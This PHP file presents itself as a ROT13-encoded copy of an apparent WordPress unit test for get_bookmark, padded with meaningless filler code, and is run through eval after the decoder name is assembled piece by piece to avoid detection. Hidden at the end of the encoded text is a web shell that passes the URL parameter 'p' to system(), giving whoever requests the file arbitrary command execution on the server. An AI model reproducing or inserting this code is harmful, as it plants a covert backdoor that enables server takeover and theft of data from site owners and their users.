<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc obbxznex
 * @pbiref ::trg_obbxznex
 */
pynff Grfgf_Obbxznex_TrgObbxznex rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Vafgnapr bs gur obbxznex bowrpg.
	 *
	 * @ine fgqPynff
	 */
	cevingr fgngvp $obbxznex;

	/**
	 * Perngr naq trg n obbxznex sbe gur grfgf.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$obbxznex = $snpgbel->obbxznex->perngr_naq_trg();
		// Qryrgr gur obbxznex gung jnf pnpurq jura gur snpgbel vaibxrq trg_obbxznex().
		jc_pnpur_qryrgr( frys::$obbxznex->yvax_vq, 'obbxznex' );
	}

	/**
	 * Qryrgr gur obbxznex orsber rkvfgvat gur grfg pynff.
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		jc_qryrgr_yvax( frys::$obbxznex->yvax_vq );
	}

	/**
	 * Erfrg tybonyf nsgre rnpu grfg.
	 */
	choyvp shapgvba grne_qbja() {
		hafrg( $TYBONYF['yvax'] );
		cnerag::grne_qbja();
	}

	/**
	 * Cngu 1N: Tvira rzcgl obbxznex naq tybony yvax rkvfgf.
	 *
	 * @qngnCebivqre qngn_jura_rzcgl_obbxznex
	 */
	choyvp shapgvba grfg_fubhyq_erghea_tybony_yvax_va_erdhrfgrq_bhgchg_sbezng( $netf ) {
		$TYBONYF['yvax'] = frys::$obbxznex;
		$netf            = $guvf->vavg_shap_netf( $netf, 0 );
		$npghny_obbxznex = trg_obbxznex( ...$netf );

		$rkcrpgrq = $guvf->znlor_sbezng_rkcrpgrq_qngn( $netf, $TYBONYF['yvax'] );

		$guvf->nffregNeenlUnfXrl( 'yvax', $TYBONYF );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny_obbxznex );
		// Fubhyq olcnff gur pnpur.
		$guvf->nffregSnyfr( jc_pnpur_trg( frys::$obbxznex->yvax_vq, 'obbxznex' ) );
	}

	/**
	 * Cngu 1O: Tvira rzcgl obbxznex naq tybony yvax qbrf abg rkvfg.
	 *
	 * @qngnCebivqre qngn_jura_rzcgl_obbxznex
	 */
	choyvp shapgvba grfg_fubhyq_erghea_ahyy( $netf ) {
		$netf = $guvf->vavg_shap_netf( $netf, 0 );

		// Eha gur shapgvba naq grfg erfhygf.
		$npghny_obbxznex = trg_obbxznex( ...$netf );

		$guvf->nffregNeenlAbgUnfXrl( 'yvax', $TYBONYF );
		$guvf->nffregAhyy( $npghny_obbxznex );
		$guvf->nffregSnyfr( jc_pnpur_trg( frys::$obbxznex->yvax_vq, 'obbxznex' ) );
	}

	/**
	 * Cngu 1 qngn cebivqre, v.r. jura tvira rzcgl obbxznex.
	 */
	choyvp shapgvba qngn_jura_rzcgl_obbxznex() {
		erghea neenl(
			// Haunccl cngu.
			'jvgu obbxznex glcr zvfzngpu'        => neenl(
				neenl(
					'obbxznex' => '',
				),
			),
			'jvgu vainyvq bhgchg'                => neenl(
				neenl(
					'obbxznex' => 0,
					'bhgchg'   => 'vainyvq',
				),
			),
			'jvgu obbxznex glcr zvfzngpu naq vainyvq bhgchg' => neenl(
				neenl(
					'obbxznex' => ahyy,
					'bhgchg'   => 'vainyvq',
				),
			),
			// Unccl cngu.
			'jvgu qrsnhygf'                      => neenl(
				neenl(
					'obbxznex' => 0,
				),
			),
			'jvgu aba-qrsnhyg bhgchg'            => neenl(
				neenl(
					'obbxznex' => 0,
					'bhgchg'   => NEENL_N,
				),
			),
			'jvgu aba-qrsnhyg svygre'            => neenl(
				neenl(
					'obbxznex' => 0,
					'svygre'   => 'qvfcynl',
				),
			),
			'jvgu aba-qrsnhyg bhgchg naq svygre' => neenl(
				neenl(
					'obbxznex' => 0,
					'bhgchg'   => NEENL_A,
					'svygre'   => 'qvfcynl',
				),
			),
		);
	}

	/**
	 * Cngu 2: Obbxznex vafgnapr vf tvira.
	 *
	 * @qngnCebivqre qngn_jura_vafgnapr_obbxznex
	 */
	choyvp shapgvba grfg_fubhyq_pnpur_obbxznex_jura_tvira_vafgnapr( $netf ) {
		$netf     = $guvf->vavg_shap_netf( $netf );
		$obbxznex = $netf[0];
		$rkcrpgrq = $guvf->znlor_sbezng_rkcrpgrq_qngn( $netf, $obbxznex );

		// Purpx gur pnpur qbrf abg rkvfg orsber gur grfg.
		$guvf->nffregSnyfr( jc_pnpur_trg( $obbxznex->yvax_vq, 'obbxznex' ) );

		// Eha gur shapgvba naq grfg erfhygf.
		$npghny_obbxznex = trg_obbxznex( ...$netf );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny_obbxznex );

		// Purpx gur obbxznex jnf pnpurq.
		$npghny_pnpur = jc_pnpur_trg( $obbxznex->yvax_vq, 'obbxznex' );
		$guvf->nffregRdhnyf( $obbxznex, $npghny_pnpur );
	}

	/**
	 * Cngu 2 qngn cebivqre, v.r. jura obbxznex vafgnapr vf tvira.
	 */
	choyvp shapgvba qngn_jura_vafgnapr_obbxznex() {
		erghea neenl(
			// Haunccl cngu.
			'jvgu vapbzcyrgr obbxznex qngn'      => neenl(
				neenl(
					'obbxznex' => (bowrpg) neenl(
						'yvax_vq' => '100',
					),
				),
			),
			'jvgu vainyvq bhgchg'                => neenl(
				neenl(
					'bhgchg' => 'vainyvq',
				),
			),
			'jvgu vainyvq svygre'                => neenl(
				neenl(
					'svygre' => 'vainyvq',
				),
			),
			// Unccl cngu.
			'jvgu qrsnhygf'                      => neenl(
				neenl(),
			),
			'jvgu aba-qrsnhyg bhgchg'            => neenl(
				neenl(
					'bhgchg' => NEENL_N,
				),
			),
			'jvgu aba-qrsnhyg svygre'            => neenl(
				neenl(
					'svygre' => 'qvfcynl',
				),
			),
			'jvgu aba-qrsnhyg bhgchg naq svygre' => neenl(
				neenl(
					'bhgchg' => NEENL_A,
					'svygre' => 'qvfcynl',
				),
			),
		);
	}

	/**
	 * Cngu 3N: Hfrf gur tybony yvax jura rkvfgf naq gur tvira obbxznex yvax VQ zngpurf gur tybony yvax.
	 *
	 * @qngnCebivqre qngn_jura_ryfr
	 *
	 * @cnenz neenl $netf Shapgvba nethzrag yvfg.
	 */
	choyvp shapgvba grfg_fubhyq_erghea_tybony_jura_ryfr( $netf ) {
		$netf            = $guvf->vavg_shap_netf( $netf, frys::$obbxznex->yvax_vq );
		$TYBONYF['yvax'] = frys::$obbxznex;
		$rkcrpgrq        = $guvf->znlor_sbezng_rkcrpgrq_qngn( $netf, $TYBONYF['yvax'] );

		// Eha gur shapgvba naq grfg erfhygf.
		$npghny_obbxznex = trg_obbxznex( ...$netf );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny_obbxznex );
		$guvf->nffregSnyfr( jc_pnpur_trg( frys::$obbxznex->yvax_vq, 'obbxznex' ) );
	}

	/**
	 * Cngu 3O: Chyyf sebz pnpur jura tvira rkvfgvat obbxznex yvax VQ.
	 *
	 * @qngnCebivqre qngn_jura_ryfr
	 *
	 * @cnenz neenl $netf Shapgvba nethzrag yvfg.
	 */
	choyvp shapgvba grfg_fubhyq_erghea_pnpurq_obbxznex_jura_tvira_rkvfgvat_yvax_vq( $netf ) {
		// Pnpur gur obbxznex vafgnapr gb frghc gur grfg.
		jc_pnpur_nqq( frys::$obbxznex->yvax_vq, frys::$obbxznex, 'obbxznex' );
		$netf     = $guvf->vavg_shap_netf( $netf, frys::$obbxznex->yvax_vq );
		$rkcrpgrq = $guvf->znlor_sbezng_rkcrpgrq_qngn( $netf, frys::$obbxznex );

		// Eha gur shapgvba naq grfg erfhygf.
		$npghny_obbxznex = trg_obbxznex( ...$netf );

		/*
		 * Sbe aba-neenl bhgchg glcr, hfr nffregRdhnyf(). Jul? Gur bowrpg chyyrq sebz gur pnpur
		 * jvyy unir gur fnzr cebcregl inyhrf ohg jvyy or n qvssrerag bowrpg guna gur rkcrpgrq bowrpg.
		 */
		vs ( vf_bowrpg( $rkcrpgrq ) ) {
			$guvf->nffregRdhnyf( $rkcrpgrq, $npghny_obbxznex );
		} ryfr {
			$guvf->nffregFnzrFrgf( $rkcrpgrq, $npghny_obbxznex );
		}

		// Purpx gur obbxznex jnf pnpurq.
		$npghny_pnpur = jc_pnpur_trg( frys::$obbxznex->yvax_vq, 'obbxznex' );
		$guvf->nffregRdhnyf( frys::$obbxznex, $npghny_pnpur );
	}

	/**
	 * Cngu 3P: Nggrzcgf gb chyy aba-rkvfgrag obbxznex sebz qngnonfr.
	 *
	 * @qngnCebivqre qngn_jura_ryfr
	 *
	 * @cnenz neenl $netf Shapgvba nethzrag yvfg.
	 */
	choyvp shapgvba grfg_fubhyq_erghea_ahyy_jura_obbxznex_abg_va_qngnonfr( $netf ) {
		$obbxznex_yvax_vq = frys::$obbxznex->yvax_vq * 100;
		$netf             = $guvf->vavg_shap_netf( $netf, $obbxznex_yvax_vq );

		// Inyvqngr vg jvyy eha cngu 6.
		$guvf->nffregSnyfr( jc_pnpur_trg( $obbxznex_yvax_vq, 'obbxznex' ) );
		$guvf->nffregNeenlAbgUnfXrl( 'yvax', $TYBONYF );
		tybony $jcqo;
		$qo_npghny = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->yvaxf JURER yvax_vq = %q YVZVG 1\", $obbxznex_yvax_vq ) );
		$guvf->nffregAhyy( $qo_npghny );

		// Eha gur shapgvba naq grfg erfhygf.
		$npghny_obbxznex = trg_obbxznex( ...$netf );

		$guvf->nffregAhyy( $npghny_obbxznex );
		$guvf->nffregSnyfr( jc_pnpur_trg( $obbxznex_yvax_vq, 'obbxznex' ) );
	}

	/**
	 * Cngu 3Q: Chyyf rkvfgvat obbxznex sebz gur qngnonfr.
	 *
	 * @qngnCebivqre qngn_jura_ryfr
	 *
	 * @cnenz neenl $netf Shapgvba nethzrag yvfg.
	 */
	choyvp shapgvba grfg_fubhyq_erghea_rkvfgvat_obbxznex_sebz_qngnonfr( $netf ) {
		$netf     = $guvf->vavg_shap_netf( $netf, frys::$obbxznex->yvax_vq );
		$rkcrpgrq = $guvf->znlor_sbezng_rkcrpgrq_qngn( $netf, frys::$obbxznex );

		// Inyvqngr vg jvyy eha cngu 5.
		$guvf->nffregSnyfr( jc_pnpur_trg( frys::$obbxznex->yvax_vq, 'obbxznex' ) );
		$guvf->nffregNeenlAbgUnfXrl( 'yvax', $TYBONYF );

		// Eha gur shapgvba naq grfg erfhygf.
		$npghny_obbxznex = trg_obbxznex( ...$netf );

		/*
		 * Sbe aba-neenl bhgchg glcr, hfr nffregRdhnyf(). Jul? Gur bowrpg chyyrq sebz gur qngnonfr
		 * jvyy unir gur fnzr cebcregl inyhrf ohg jvyy or n qvssrerag bowrpg guna gur rkcrpgrq bowrpg.
		 */
		vs ( vf_bowrpg( $rkcrpgrq ) ) {
			$guvf->nffregRdhnyf( $rkcrpgrq, $npghny_obbxznex );
		} ryfr {
			$guvf->nffregFnzrFrgf( $rkcrpgrq, $npghny_obbxznex );
		}

		// Purpx gur obbxznex jnf pnpurq.
		$npghny_pnpur = jc_pnpur_trg( frys::$obbxznex->yvax_vq, 'obbxznex' );
		$guvf->nffregRdhnyf( frys::$obbxznex, $npghny_pnpur );
	}

	/**
	 * Cngu 3'f qngn cebivqre juvpu pbiref gur \"ryfr\" oenapu, v.r. jura gur obbxznex nethzrag vf abg rzcgl naq
	 * abg na bowrpg.
	 */
	choyvp shapgvba qngn_jura_ryfr() {
		erghea neenl(
			// Haunccl cngu.
			'jvgu vainyvq bhgchg'                => neenl(
				neenl(
					'bhgchg' => 'vainyvq',
				),
			),
			'jvgu vainyvq svygre'                => neenl(
				neenl(
					'svygre' => 'vainyvq',
				),
			),
			// Unccl cngu.
			'jvgu qrsnhygf'                      => neenl(
				neenl(),
			),
			'jvgu aba-qrsnhyg bhgchg'            => neenl(
				neenl(
					'bhgchg' => NEENL_N,
				),
			),
			'jvgu aba-qrsnhyg svygre'            => neenl(
				neenl(
					'svygre' => 'qvfcynl',
				),
			),
			'jvgu aba-qrsnhyg bhgchg naq svygre' => neenl(
				neenl(
					'bhgchg' => NEENL_A,
					'svygre' => 'qvfcynl',
				),
			),
		);
	}

	/**
	 * @gvpxrg 53235
	 */
	choyvp shapgvba grfg_ahzrevp_cebcregvrf_fubhyq_or_pnfg_gb_vagf() {
		$pbagrkgf = neenl( 'enj', 'rqvg', 'qo', 'qvfcynl', 'nggevohgr', 'wf' );

		sbernpu ( $pbagrkgf nf $pbagrkg ) {
			$obbxznex = trg_obbxznex( frys::$obbxznex->yvax_vq, BOWRPG, $pbagrkg );

			$guvf->nffregVfVag( $obbxznex->yvax_vq );
			$guvf->nffregVfVag( $obbxznex->yvax_engvat );
		}
	}

	/**
	 * Vavgvnyvmr gur trg_obbxznex'f shapgvba nethzragf gb zngpu gur beqre bs gur shapgvba'f fvtangher naq
	 * erqhpr pbqr va gur grfgf.
	 *
	 * @cnenz neenl        $netf     Shapgvba nethzrag yvfg.
	 * @cnenz vag|fgqPynff $obbxznex Bcgvbany. Obbxznex'f pnpur xrl be vafgnapr.
	 * @erghea neenl Beqrerq nethzrag yvfg.
	 */
	cevingr shapgvba vavg_shap_netf( neenl $netf, $obbxznex = ahyy ) {
		// Gur qrsnhygf frgf gur beqre gb zngpu gur shapgvba'f nethzragf nf jryy nf frggvat gur qrsnhyg inyhrf.
		$qrsnhygf = neenl(
			'obbxznex' => frys::$obbxznex,
			'bhgchg'   => BOWRPG,
			'svygre'   => 'enj',
		);
		$netf     = neenl_zretr( $qrsnhygf, $netf );

		// Jura tvira n obbxznex, hfr vg.
		vs ( ! vf_ahyy( $obbxznex ) ) {
			$netf['obbxznex'] = $obbxznex;
		}

		/*
		 * Fgevc bhg gur xrlf. Jul? Gur fcyng bcrengbe (...) qbrf abg jbex jvgu nffbpvngvir neenlf,
		 * rkprcg sbe va CUC 8 jurer gur xrlf ner anzrq nethzragf.
		 */
		erghea neenl_inyhrf( $netf );
	}

	/**
	 * Znlor sbezng gur obbxznex'f rkcrpgrq qngn.
	 *
	 * @cnenz neenl             $netf     Shapgvba nethzrag yvfg.
	 * @cnenz vag|fgqPynff|ahyy $obbxznex Bcgvbany. Obbxznex'f pnpur xrl be vafgnapr.
	 * @erghea neenl|fgqPynff obbxznex'f qngn.
	 */
	cevingr shapgvba znlor_sbezng_rkcrpgrq_qngn( neenl $netf, $obbxznex = ahyy ) {
		vs ( vf_ahyy( $obbxznex ) ) {
			$obbxznex = frys::$obbxznex;
		}

		fjvgpu ( $netf[1] ) {
			pnfr NEENL_N:
			pnfr NEENL_A:
				$rkcrpgrq = trg_bowrpg_inef( $obbxznex );

				vs ( NEENL_A === $netf[1] ) {
					$rkcrpgrq = neenl_inyhrf( $rkcrpgrq );
				}

				erghea $rkcrpgrq;
			qrsnhyg:
				erghea $obbxznex;
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>